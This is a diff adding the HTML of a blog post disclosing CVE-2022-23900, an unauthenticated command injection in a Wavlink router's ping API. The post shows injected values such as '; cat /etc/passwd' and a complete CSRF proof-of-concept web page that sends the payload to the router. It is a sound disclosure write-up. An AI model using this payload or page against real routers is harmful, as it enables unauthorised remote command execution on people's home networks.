@@ -1,0 +1,305 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Stig's Lab Notes | Wavlink Command Injection - CVE-2022-23900</title>
+  <meta name="description" content="An unauthenticated command injection in the Wavlink WL-WN531P3 router API, exploitable from the internet via CSRF.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Wavlink Command Injection - CVE-2022-23900">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://stigward.github.io/posts/wavlink-command-injection/">
+  <meta property="og:description" content="An unauthenticated command injection in the Wavlink WL-WN531P3 router API, exploitable from the internet via CSRF.">
+  <meta property="og:site_name" content="Stig's Lab Notes">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://stigward.github.io/posts/wavlink-command-injection/">
+  <meta name="twitter:title" content="Wavlink Command Injection - CVE-2022-23900">
+  <meta name="twitter:description" content="An unauthenticated command injection in the Wavlink WL-WN531P3 router API, exploitable from the internet via CSRF.">
+
+  
+    <meta property="og:image" content="https://stigward.github.io/assets/og-image-ee46bbc61b334e821e81534b1fd43f3fee6f020ec174b3c2114445695fd48c01.jpg">
+    <meta name="twitter:image" content="https://stigward.github.io/assets/og-image-ee46bbc61b334e821e81534b1fd43f3fee6f020ec174b3c2114445695fd48c01.jpg">
+  
+
+  <link href="https://stigward.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="Stig's Lab Notes Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-dark-11327753546b2135c989eee5cd83497a2734b702928d016839d795f6c706e3d5.ico">
+      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-dark-d161409442b7e523089f24d08d0a55951549ece7504207c376d53b020713494d.png">
+      <link rel="stylesheet" type="text/css" href="/assets/dark-c3423cb8f8dc5b46f03bebdb004bc5d65fb395e4743a83975c4a75e75300a1ca.css" integrity="sha256-w0I8uPjcW0bwO+vbAEvF1l+zleR0OoOXXEp151MAoco=" crossorigin="anonymous">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="Stig's Lab Notes">Stig's Lab Notes</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/_stigward" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/stigward" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:stigward.research@gmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="/feed.xml" rel="noreferrer noopener" target="_blank" title="RSS">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-rss">
+  <use href="/assets/rss-541ec5cea9cefd10d2fcfec01888f3f231a8829940249835fa7b7b3a12ae0d0d.svg#icon-rss" xlink:href="/assets/rss-541ec5cea9cefd10d2fcfec01888f3f231a8829940249835fa7b7b3a12ae0d0d.svg#icon-rss"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+  </ul>
+</nav>
+
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Wavlink Command Injection - CVE-2022-23900</h1>
+            <p>An unauthenticated command injection in the Wavlink WL-WN531P3 router API, exploitable from the internet via CSRF.</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    April 5, 2022
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      4 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/firmware" title="See all posts with tag 'Firmware'">Firmware</a>
+    
+      
+      <a href="/tag/research" title="See all posts with tag 'Research'">Research</a>
+    
+      
+      <a href="/tag/iot" title="See all posts with tag 'IoT'">IoT</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <h1 id="wavlink-command-injection-cve-202223900">Wavlink Command Injection (CVE-2022–23900)</h1>
+
+<h2 id="tldr">TL/DR:</h2>
+
+<p>The  <a href="https://www.amazon.com/Wireless-Touchlink-Beamforming-High-Gain-Connections/dp/B07WNV36B2">Wavlink WL-WN531P3 router</a>  exposes an API endpoint susceptible to command injection. This API endpoint is reachable without an authentication header, meaning the vulnerability can be exploited by an unauthenticated attacker. Furthermore, the router has no CSRF protection, thus RCE can be achieved without connecting to the local network.</p>
+
+<h2 id="vulnerability-description-and-discovery">Vulnerability Description and Discovery:</h2>
+
+<p>The router hosts an API that is used to accept requests made from within the Admin portal. One thing a user can do from within this portal is send a  <code class="highlighter-rouge">ping</code>  command. An example has been included below:</p>
+
+<p><img src="https://miro.medium.com/max/1400/1*r2YxDLi4t-Db4XZQ8z3Pyg.png" alt="" /></p>
+
+<p>Because  <code class="highlighter-rouge">ping</code>  is a well-known bash command, we may immediately begin to theorize about the possibility of command injection.</p>
+
+<h3 id="command-injection-explanation">Command Injection Explanation:</h3>
+
+<p>For those unfamiliar with command injection, here is a quick rundown:</p>
+
+<p>Let’s take the above  <code class="highlighter-rouge">ping</code>  functionality and walk through what could be happening between the web portal and the router.</p>
+
+<ol>
+  <li>You as the user input the IP you wish to ping.</li>
+  <li>The Admin portal sends a request to the router with the IP you specified.</li>
+  <li>The router’s API endpoint handles the request with something like the following (yes this example has a BOF, it’s strictly an example):</li>
+</ol>
+
+<p>char command[50];<br />
+strcpy(command, “ping “)<br />
+strcat(command, user_specified_ip)<br />
+system(command)</p>
+
+<p>In the above code, we first add “ping “ to the  <code class="highlighter-rouge">command</code>  buffer. Then we add what is stored in  <code class="highlighter-rouge">user_specified_ip</code>  to our buffer, imagining this variable is storing the IP we specified in the Admin portal. Finally, we run  <code class="highlighter-rouge">system(command)</code>  which will execute our shell command (<code class="highlighter-rouge">ping &lt;ip&gt;</code>) on the underlying host operating system.</p>
+
+<h3 id="abusing-the--system--command">Abusing the  <code class="highlighter-rouge">system</code>  command:</h3>
+
+<p>You can run two shell commands in one line if you delaminate them with a  <code class="highlighter-rouge">;</code>  . So if you open a command prompt and run  <code class="highlighter-rouge">whoami; touch test.txt</code>  , the command will first output the result  <code class="highlighter-rouge">whoami</code>  and then it will create the file  <code class="highlighter-rouge">test.txt</code>. With this knowledge, we can exploit the  <code class="highlighter-rouge">ping</code>  example from above.</p>
+
+<ol>
+  <li>Instead of inputting an IP in the admin panel, we input  <code class="highlighter-rouge">; whoami</code>.</li>
+  <li>Now the command that gets run on the underlying OS is  <code class="highlighter-rouge">ping ; whoami</code>.</li>
+  <li>The ping command fails as no argument is provided to it, and  <code class="highlighter-rouge">whoami</code>  subsequently executes, demonstrating an ability to run arbitrary commands on the box.</li>
+</ol>
+
+<h2 id="exploitation">Exploitation:</h2>
+
+<p>So, spoiler alert but the explanation above is pretty much verbatim what is happening on the router. We can demonstrate this by providing the following input:</p>
+
+<p><img src="https://miro.medium.com/proxy/1*hFDF_mkt0cCcd37fAGjnnQ.png" alt="" /></p>
+
+<p>We can also prove that the filesystem is not just read-only by creating a new file.</p>
+
+<p><img src="https://miro.medium.com/proxy/1*LTSwXi7yDe0JsFOxSDQW7A.png" alt="" /></p>
+
+<p><img src="https://miro.medium.com/proxy/1*80gO-SzHr7KiC0qq-hk3Ww.png" alt="" /></p>
+
+<p>Things get slightly more interesting though. Looking at the screenshot of a malicious request below, we note that the  <code class="highlighter-rouge">pingIp</code>  variable, which is sent in a POST to the  <code class="highlighter-rouge">/cgi-bin/adm.cgi</code>  endpoint, is what contains our payload. Here we are reading the contents of  <code class="highlighter-rouge">/etc/passwd</code></p>
+
+<p><img src="https://miro.medium.com/proxy/1*FkzY1fRMKaikN7AmpbHMog.png" alt="" /></p>
+
+<p>Because the user is logged in to the Admin portal, our malicious request includes a session cookie in the header (line 13 in the above screenshot). However, if we remove that header, the request is still successful, demonstrating this vulnerability is exploitable by an unauthenticated attacker.</p>
+
+<p><img src="https://miro.medium.com/proxy/1*ZYKq-qBoVQAKMe75WzTqIQ.png" alt="" /></p>
+
+<h3 id="chaining-with-a-csrf">Chaining with a CSRF:</h3>
+
+<p>The last step to weaponizing this exploit is adding the malicious request to an attacker-controlled website. The idea is as follows:</p>
+
+<ol>
+  <li>An attacker from anywhere in the world creates a website that sends a malicious request to  <code class="highlighter-rouge">192.168.10.1/cgi-bin/adm.cgi</code>.</li>
+  <li>The attacker sends the site to someone with the vulnerable Wavlink router.</li>
+  <li>The victim opens the site, and a malicious request is sent to the router on their local network.</li>
+</ol>
+
+<p>We can use the following fake website to achieve this result:</p>
+
+<p><em>Note that I have our payload submitted on a button click, but we could have it take place on page load for less required user interaction.</em></p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>  
+    <span class="nt">&lt;body&gt;</span>  
+        <span class="nt">&lt;h1&gt;</span>Totally Not Malicious Website<span class="nt">&lt;/h1&gt;</span>  
+        <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://192.168.10.1/cgi-bin/adm.cgi"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>  
+            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"page"</span> <span class="na">value=</span><span class="s">"ping_test"</span> <span class="nt">/&gt;</span>  
+            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"CCMD"</span> <span class="na">value=</span><span class="s">"4"</span> <span class="nt">/&gt;</span>  
+            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"pingIp"</span> <span class="na">value=</span><span class="s">"; cat /etc/passwd"</span> <span class="nt">/&gt;</span>  
+            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"DONT CLICK"</span> <span class="nt">/&gt;</span>  
+        <span class="nt">&lt;/form&gt;</span>  
+    <span class="nt">&lt;/body&gt;</span>  
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>And with that, an unauthenticated RCE from outside the local network can be achieved on any Wavlink WL-WN531P3 router.</p>
+
+<p><img src="https://miro.medium.com/proxy/1*CAF3uI-pod2D8rTRwnzK5g.png" alt="" /></p>
+
+<p><img src="https://miro.medium.com/proxy/1*QpMHjRWuKUn6k3QJv_hXqg.png" alt="" /></p>
+
+<h2 id="closing-thoughts">Closing Thoughts:</h2>
+
+<p>This is a meme of an issue, but it is my first official CVE so I’ll take it. It does emphasize that IoT devices still struggle with low-hanging vulnerabilities, so if you are looking for a way to get started in security research, this is a good area to get your hands dirty.</p>
+
+<p>If you enjoyed this write-up, feel free to follow me on Twitter  <a href="https://twitter.com/_stigward">@<em>stigward</em></a>, where I tweet things about security, programming, and current projects. Currently, I am working on some content related to IoT hacking and smart contract auditing</p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Wavlink+Command+Injection+-+CVE-2022-23900%20-%20https://stigward.github.io/posts/wavlink-command-injection/%20by%20@_stigward" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://stigward.github.io/posts/wavlink-command-injection/" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    &copy; 2026 Stig's Lab Notes.
+    Built with <a href="https://github.com/nielsenramon/chalk" rel="noreferrer noopener" target="_blank" title="Chalk theme for Jekyll">Chalk</a>.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QK87P1LVPH"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-QK87P1LVPH');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-bcef26dde016217d3eab202f42759aae5d17330fdb76331068f6269a84d8437f.js" integrity="sha256-vO8m3eAWIX0+qyAvQnWarl0XMw/bdjMQaPYmmoTYQ38=" crossorigin="anonymous"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-cd7eae67265bcd101d0f598456b16171b2533d714dcc3a5b6ddacfdf234c4cbc.js" integrity="sha256-zX6uZyZbzRAdD1mEVrFhcbJTPXFNzDpbbdrP3yNMTLw=" crossorigin="anonymous"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-7691f37e9154c7d53f7515a518dbb0faf3a73d9b3d5b75522867a134952d0a76.js" integrity="sha256-dpHzfpFUx9U/dRWlGNuw+vOnPZs9W3VSKGehNJUtCnY=" crossorigin="anonymous"></script>
+
+
+<script type="text/javascript" src="/assets/application-7b6260deb98e64a8a42b97f5c18ad2a8c9507d70f9a097a440b354770f979dc7.js" integrity="sha256-e2Jg3rmOZKikK5f1wYrSqMlQfXD5oJekQLNUdw+Xncc=" crossorigin="anonymous"></script>
+
+
+</body>
+</html>
